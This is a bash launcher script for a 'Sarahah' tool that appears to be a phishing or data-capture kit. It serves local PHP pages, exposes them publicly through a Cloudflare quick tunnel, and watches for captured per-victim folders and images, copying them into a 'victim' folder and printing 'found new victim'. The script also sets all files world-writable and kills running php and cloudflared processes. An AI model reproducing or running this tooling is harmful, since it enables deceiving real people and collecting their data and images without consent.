#!/bin/bash

#change mod all file and folder 
chmod -R 777 ./
#clear terminal
clear

#colors
red="\e[31m"
green="\e[32m"
yelo="\e[1;33m"
cyn="\e[36m"
nc="\e[0m"

#function_write
loopF () {
for (( i=0; i<${#text}; i++ )); do
    echo -n "${text:$i:1}"
    sleep 0.02
done
}

#function_my cat
mycat () {
echo -e "${yelo} "
cat << "caty" 
,_     _
 |\\_,-~/
 / _  _ |    ,--.
(  @  @ )   / ,-'
 \  _T_/-._( (
 /         `. \
|         _  \ |
 \ \ ,  /      |
  || |-_\__   /
 ((_/`(____,-'
_____________________
caty
}

#function_banner
banner () {
text=" Sarahah script by  "
loopF
printf "${nc}@AhmadAllam${nc}"
}

menu () {
mkdir victim > /dev/null 2>&1 &
echo ""
echo ""
echo -e " [1]:${cyn}Sarahah v1 ${nc} "
echo -e " [2]:${cyn}Sarahah v2 ${nc} "
echo -e " [0]:${cyn}about & help ${nc} "
echo -e ""

## Kill already running process
kill_pid() {
	check_PID="php cloudflared"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then 
			killall ${process} > /dev/null 2>&1 
		fi
	done
}

clean () {
    if find . -maxdepth 1 -type d -name "*[0-9]*" -newermt "$(date -d '24 hours ago' +'%Y-%m-%d %H:%M:%S')" -print -quit | grep -q .; then
        find . -maxdepth 1 -type d -name "*[0-9]*" -exec rm -r {} \;
        
    fi
}

searching_1() {
    cd src1
    rm -r All_images > /dev/null 2>&1 &
	echo -e "\n [Waiting for victim, ${red}Ctrl + C ${nc}to exit...]"
	echo " "
	printed_founded=false
while true
do
    if find . -maxdepth 1 -type d -name "*[0-9]*" -newermt "$(date -d '24 hours ago' +'%Y-%m-%d %H:%M:%S')" -print -quit | grep -q .; then
    cp -r $(find . -maxdepth 1 -type d -name "*[0-9]*") ../victim
    cp -r All_images ../victim > /dev/null 2>&1 &
    if ! $printed_founded; then
            echo -e " ${green}found new victim now look at ${red}victim${nc} ${green}folder${nc}"
            printed_founded=true
        fi
    fi
done
}

searching_2() {
    cd src2
    rm -r All_images > /dev/null 2>&1 &
	echo -e "\n [Waiting for victim, ${red}Ctrl + C ${nc}to exit...]"
	echo " "
	printed_founded=false
while true
do
    if find . -maxdepth 1 -type d -name "*[0-9]*" -newermt "$(date -d '24 hours ago' +'%Y-%m-%d %H:%M:%S')" -print -quit | grep -q .; then
    cp -r $(find . -maxdepth 1 -type d -name "*[0-9]*") ../victim
    cp -r All_images ../victim > /dev/null 2>&1 &
    if ! $printed_founded; then
            echo -e " ${green}found new victim now look at ${red}victim${nc} ${green}folder${nc}"
            printed_founded=true
        fi
    fi
done
}


#Start Cloudflared
start_cloudflared() { 
cd ..
text=" [starting cloudflared server...]"
loopF
rm cldf.log > /dev/null 2>&1 &
./cloudflared tunnel -url 127.0.0.1:8080 --logfile cldf.log > /dev/null 2>&1 &
 sleep 10
cloud_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cldf.log")
printf "\n $green"
text=$cloud_url
loopF
printf "\n $nc"
}

#sarahah v1
src1 () {
if [ -d "src1" ]; then
    echo " "
    cd src1
    clean
    php -S 127.0.0.1:8080  > /dev/null 2>&1 &
    text=" [starting php server...]"
    loopF
    echo " "
    echo -e "$green http://127.0.0.1:8080 $nc"
    echo " " && start_cloudflared
else
    echo -e "$red"
    text="src folder not found please redownload the tool"
    loopF
    echo -e "$nc"
    exit
fi
}

#sarahah v2
src2 () {
if [ -d "src2" ]; then
    echo " "
    cd src2
    clean
    php -S 127.0.0.1:8080  > /dev/null 2>&1 &
    text=" [starting php server....]"
    loopF
    echo " "
    echo -e "$green http://127.0.0.1:8080 $nc"
    echo " " && start_cloudflared
else
    echo -e "$red"
    text="src folder not found please redownload the tool"
    loopF
    echo -e "$nc"
    exit
fi
}

#choice
printf "${green} Select Site number ${nc} : "
read -p "" entry
#cases
case $entry in
	  1 | 01)
	  kill_pid
	  src1
	  searching_1
      ;;
      
	  2 | 02)
	  kill_pid
	  src2
	  searching_2
      ;;
      
	0 | 00)
	clear
echo -e "${green} "
text="               ««««<About me>»»»»"
loopF
echo -e "${nc} "
printf "\n"
grep -A 5 "Written" help.txt
#################################
echo -e "${green} "
text="   __________what's sarahah v1 and v2___________"
loopF
echo -e "${nc} "
printf "\n"
grep -A 7 "1:sarahah v1" help.txt
printf "\n"
################################
echo -e "${yelo} "
helpo=$(grep -A 20 "________________________" help.txt)
for (( i=0; i<${#helpo}; i++ )); do
    echo -n "${helpo:$i:1}"
    sleep 0.01
done
echo -e "${nc} "
printf "\n \n \n \n"
menu
 ;;
      
	  *)
	  clear
	  echo "Select correct number please :("
	  menu
	  ;;

esac
}
#function_goodbye
goodbye () {
printf "\n\n$red thanks & goodbye.$nc"
      exit
}
trap goodbye INT
##call functions
mycat
banner
menu
kill_pid

#by AhmadAllam
#my telegram @echo_Allam